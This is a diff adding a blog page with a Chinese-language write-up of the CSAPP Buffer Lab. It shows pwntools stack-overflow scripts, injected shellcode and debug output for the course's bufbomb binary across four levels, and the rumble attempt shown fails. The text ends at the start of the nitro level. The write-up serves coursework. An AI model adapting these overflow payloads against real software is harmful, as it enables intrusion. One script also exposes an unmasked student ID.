@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Gazettm">
+
+
+
+
+
+<title>CSAPP_Buf_lab | Gazettm&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Gazettm&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Gazettm&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CSAPP_Buf_lab</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Gazettm</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十二月 13, 2025&nbsp;&nbsp;23:23:32</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CSAPP/">CSAPP</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="CSAPP-Buf-lab"><a href="#CSAPP-Buf-lab" class="headerlink" title="CSAPP_Buf_lab"></a>CSAPP_Buf_lab</h1><p>本次实验一共有四关。</p>
+<p>因为有<code>ctf</code>基础，所以将会涉及到一些工具的使用。</p>
+<p>python脚本中的星号为本人学号，可根据自己情况填写。</p>
+<h2 id="smoke"><a href="#smoke" class="headerlink" title="smoke"></a>smoke</h2><p>本关卡要求跳转到<code>smoke</code>函数</p>
+<p>经IDA pro反汇编之后，可知该程序运行之后会跳转到test函数，在<code>test</code>函数中使用了<code>getbuf</code>函数，给了一个写入漏洞，可以用于覆盖返回地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">103</span>]; <span class="comment">// [esp+1h] [ebp-67h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Gets(v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可知读取了103个数据，因此我们可以填入103个数据之后，给出4个任意值覆盖原<code>ebp</code>位置，再填入4个字节返回地址，从而得出答案。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&#x27;./bufbomb&#x27;</span>, <span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;********&#x27;</span>])</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x65&#x27;</span> * <span class="number">107</span></span><br><span class="line">backdoor = p32(<span class="number">0x080493D5</span>)</span><br><span class="line">io.sendline(payload + backdoor)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>其中<code>0x080493D5</code>为<code>smoke</code>函数的地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 pwn1.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./bufbomb&#x27;</span> argv=[b<span class="string">&#x27;./bufbomb&#x27;</span>, b<span class="string">&#x27;-u&#x27;</span>, b<span class="string">&#x27;**********&#x27;</span>] : pid 2630</span><br><span class="line">[DEBUG] Sent 0x70 bytes:</span><br><span class="line">    00000000  65 65 65 65  65 65 65 65  65 65 65 65  65 65 65 65  │eeee│eeee│eeee│eeee│</span><br><span class="line">    *</span><br><span class="line">    00000060  65 65 65 65  65 65 65 65  65 65 65 d5  93 04 08 0a  │eeee│eeee│eee·│····│</span><br><span class="line">    00000070</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./bufbomb&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 2630)</span><br><span class="line">[DEBUG] Received 0x5d bytes:</span><br><span class="line">    b<span class="string">&#x27;Userid: **********\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Cookie: 0x3d7ded44\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Type string:Smoke!: You called smoke()\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;VALID\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;NICE JOB!\n&#x27;</span></span><br><span class="line">Userid: **********</span><br><span class="line">Cookie: 0x3d7ded44</span><br><span class="line">Type string:Smoke!: You called smoke()</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="fizz"><a href="#fizz" class="headerlink" title="fizz"></a>fizz</h2><p>本关卡要求跳转到<code>fizz</code>函数，与第一关的区别在于，<code>fizz</code>函数带有一个参数，需要验证。</p>
+<p>同样的，我们写入103个数据，在之后给出4个任意值覆盖原<code>ebp</code>，再填入4字节目标函数地址。然后填入4个任意的值覆盖目标函数的返回地址，最后填入参数的值。这里的a1是cookie值，是已知的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&#x27;./bufbomb&#x27;</span>, <span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;********&#x27;</span>])</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x65&#x27;</span> * <span class="number">107</span></span><br><span class="line">backdoor = p32(<span class="number">0x08049402</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;\x44\xed\x7d\x3d&#x27;</span></span><br><span class="line">io.sendline(payload + backdoor * <span class="number">2</span> + payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>0x08049402</code>是fizz函数的地址，另外cookie值是<code>0x3d7ded44</code>，由于小端存储我们需要根据小端来写。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 pwn2.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./bufbomb&#x27;</span> argv=[b<span class="string">&#x27;./bufbomb&#x27;</span>, b<span class="string">&#x27;-u&#x27;</span>, b<span class="string">&#x27;**********&#x27;</span>] : pid 2643</span><br><span class="line">[DEBUG] Sent 0x78 bytes:</span><br><span class="line">    00000000  65 65 65 65  65 65 65 65  65 65 65 65  65 65 65 65  │eeee│eeee│eeee│eeee│</span><br><span class="line">    *</span><br><span class="line">    00000060  65 65 65 65  65 65 65 65  65 65 65 02  94 04 08 02  │eeee│eeee│eee·│····│</span><br><span class="line">    00000070  94 04 08 44  ed 7d 3d 0a                            │···D│·&#125;=·│</span><br><span class="line">    00000078</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./bufbomb&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 2643)</span><br><span class="line">[DEBUG] Received 0x65 bytes:</span><br><span class="line">    b<span class="string">&#x27;Userid: **********\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Cookie: 0x3d7ded44\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Type string:Fizz!: You called fizz(0x3d7ded44)\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;VALID\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;NICE JOB!\n&#x27;</span></span><br><span class="line">Userid: **********</span><br><span class="line">Cookie: 0x3d7ded44</span><br><span class="line">Type string:Fizz!: You called fizz(0x3d7ded44)</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="bang"><a href="#bang" class="headerlink" title="bang"></a>bang</h2><p>本关卡有一个验证条件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">bang</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( global_value == cookie )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);</span><br><span class="line">    validate(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如上所示，需要<code>global_value</code>的值与cookie的值相等。由于给出栈，我们可以在栈中写入指令信息，栈溢出到缓冲区的地址来执行栈中内容，之后再返回到bang中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">print</span> global_value</span><br></pre></td></tr></table></figure>
+
+<p>通过再gdb调试中我们可以得到<code>global_value</code>的地址为<code>0x804d1a8</code>，同样方法取得cookie的地址为<code>0x804d1a0</code></p>
+<p>关于缓冲区地址，我们可以这样的到</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">break</span> getbuf</span><br><span class="line">(gdb) run -u ********</span><br><span class="line">(gdb) <span class="built_in">print</span>/x <span class="variable">$ebp</span>-0x67</span><br></pre></td></tr></table></figure>
+
+<p>关于为什么这么做，我们看以下<code>objdump</code>得出的汇编代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">8049c47:	8d 45 99             	lea    -0x67(%ebp),%eax</span><br><span class="line">8049c4a:	50                   	push   %eax</span><br><span class="line">8049c6d:	e8 97 fa ff ff       	call   8049709 &lt;Gets&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里把<code>ebp-0x67</code>放入<code>eax</code>寄存器中，然后调用<code>Gets</code>函数，这里的<code>push</code>入栈的即为缓冲区的起始地址，缓冲区的信息从此处写入。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&#x27;./bufbomb&#x27;</span>, <span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;********&#x27;</span>])</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">cookie = <span class="number">0x3d7ded44</span></span><br><span class="line">global_value_addr = <span class="number">0x804d1a8</span></span><br><span class="line">bang_addr = <span class="number">0x08049453</span></span><br><span class="line">buffer_addr = <span class="number">0x55683bc9</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&#x27;\xa1\xa0\xd1\x04\x08&#x27;</span> + <span class="string">b&#x27;\xa3\xa8\xd1\x04\x08&#x27;</span> +<span class="string">b&#x27;\x68&#x27;</span> + p32(bang_addr) + <span class="string">b&#x27;\xc3&#x27;</span></span><br><span class="line">nop = <span class="string">b&#x27;\x90&#x27;</span> * (<span class="number">87</span> + <span class="number">4</span>)</span><br><span class="line">backdoor = p32(buffer_addr)</span><br><span class="line">io.sendline(shellcode + nop + backdoor)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里的指令<code>a1 a0 d1 04 08</code>是<code>mov 0x0804d1a0 %eax</code>即为将内存地址<code>0x0804d1a0</code>存储的值（cookie）放入<code>eax</code>中。<code>a3 a8 d1 04 08</code></p>
+<p>是<code>mov %eax 0x804d1a8</code>即为把<code>eax</code>中的值放入0x0804d1a0中（global_value）。而之后的<code>68</code>是push一个32位地址的值，加上bang的地址，然后<code>c3</code>是<code>ret</code>，执行完之后要返回到函数<code>bang</code>中，而<code>backdoor</code>是指缓冲区的首地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 pwn3.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./bufbomb&#x27;</span> argv=[b<span class="string">&#x27;./bufbomb&#x27;</span>, b<span class="string">&#x27;-u&#x27;</span>, b<span class="string">&#x27;**********&#x27;</span>] : pid 2651</span><br><span class="line">[DEBUG] Sent 0x70 bytes:</span><br><span class="line">    00000000  a1 a0 d1 04  08 a3 a8 d1  04 08 68 53  94 04 08 c3  │····│····│··hS│····│</span><br><span class="line">    00000010  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    00000060  90 90 90 90  90 90 90 90  90 90 90 c9  3b 68 55 0a  │····│····│····│;hU·│</span><br><span class="line">    00000070</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./bufbomb&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 2651)</span><br><span class="line">[DEBUG] Received 0x6c bytes:</span><br><span class="line">    b<span class="string">&#x27;Userid: **********\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Cookie: 0x3d7ded44\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Type string:Bang!: You set global_value to 0x3d7ded44\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;VALID\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;NICE JOB!\n&#x27;</span></span><br><span class="line">Userid: **********</span><br><span class="line">Cookie: 0x3d7ded44</span><br><span class="line">Type string:Bang!: You <span class="built_in">set</span> global_value to 0x3d7ded44</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="rumble"><a href="#rumble" class="headerlink" title="rumble"></a>rumble</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">rumble</span><span class="params">(<span class="type">void</span> *s1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( eval2equal(s1, cookie) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Rumble!: You called rumble(\&quot;%s\&quot;)\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)s1);</span><br><span class="line">    validate(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called rumble(\&quot;%s\&quot;)\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)s1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里利用了一个判断，判断s1所指向的内容和cookie的值是否相等，那么这个就很简单了，只需要把这个参数的值改为cookie的值就可以了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&#x27;./bufbomb&#x27;</span>, <span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;2410120028&#x27;</span>])</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x65&#x27;</span> * <span class="number">3</span> +  <span class="string">b&quot;3D7DED44\x00&quot;</span> + <span class="string">b&#x27;\x65&#x27;</span> * <span class="number">95</span></span><br><span class="line">backdoor = p32(<span class="number">0x08049514</span>)</span><br><span class="line">payload2 = p32(<span class="number">0x55683bcc</span>)</span><br><span class="line">io.sendline(payload + backdoor  + payload2 * <span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>3D7DED44</code>是cookie的值，<code>\x00</code>是用于结束读取。这里的<code>0x55683bcc</code>是指针<code>s1</code>所指向的值，由于栈对齐的原因，我们不能写起始的地址<code>0x55683bc9</code>，这样会由于栈对齐的原因解析错误。所以我们填入3个无意义的值，同时把地址+3用于栈对齐，即可让指针<code>s1</code>指向的值变为cookie的值。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 pwn4.py                          </span><br><span class="line">[/.......] Starting <span class="built_in">local</span> process <span class="string">&#x27;./bufbomb&#x27;</span> argv=[b<span class="string">&#x27;./bufbomb&#x27;</span>, b<span class="string">&#x27;-u&#x27;</span>, b<span class="string">&#x27;**********&#x27;</span>] : pid 283[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./bufbomb&#x27;</span> argv=[b<span class="string">&#x27;./bufbomb&#x27;</span>, b<span class="string">&#x27;-u&#x27;</span>, b<span class="string">&#x27;2410120028&#x27;</span>] : pid 2836</span><br><span class="line">[DEBUG] Sent 0x78 bytes:</span><br><span class="line">    00000000  65 65 65 33  44 37 44 45  44 34 34 00  65 65 65 65  │eee3│D7DE│D44·│eeee│</span><br><span class="line">    00000010  65 65 65 65  65 65 65 65  65 65 65 65  65 65 65 65  │eeee│eeee│eeee│eeee│</span><br><span class="line">    *</span><br><span class="line">    00000060  65 65 65 65  65 65 65 65  65 65 65 14  95 04 08 cc  │eeee│eeee│eee·│····│</span><br><span class="line">    00000070  3b 68 55 cc  3b 68 55 0a                            │;hU·│;hU·│</span><br><span class="line">    00000078</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./bufbomb&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 2836)</span><br><span class="line">[DEBUG] Received 0x5d bytes:</span><br><span class="line">    b<span class="string">&#x27;Userid: **********\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Cookie: 0x3d7ded44\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Type string:Misfire: You called rumble(&quot;3D7DE3D7DED4&quot;)\n&#x27;</span></span><br><span class="line">Userid: **********</span><br><span class="line">Cookie: 0x3d7ded44</span><br><span class="line">Type string:Misfire: You called rumble(<span class="string">&quot;3D7DE3D7DED4&quot;</span>)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
+
+<h2 id="nitro"><a href="#nitro" class="headerlink" title="nitro"></a>nitro</h2><p>这里需要我们加入参数-n用于启动nitro模式。</p>
+<p>在这个模式中会调用testn函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">testn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-24h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = uniqueval();</span><br><span class="line">  v2 = getbufn();</span><br><span class="line">  <span class="keyword">if</span> ( uniqueval() != v1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != cookie )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbufn returned 0x%x\n&quot;</span>, v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;KABOOM!: getbufn returned 0x%x\n&quot;</span>, v2);</span><br><span class="line">  <span class="keyword">return</span> validate(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
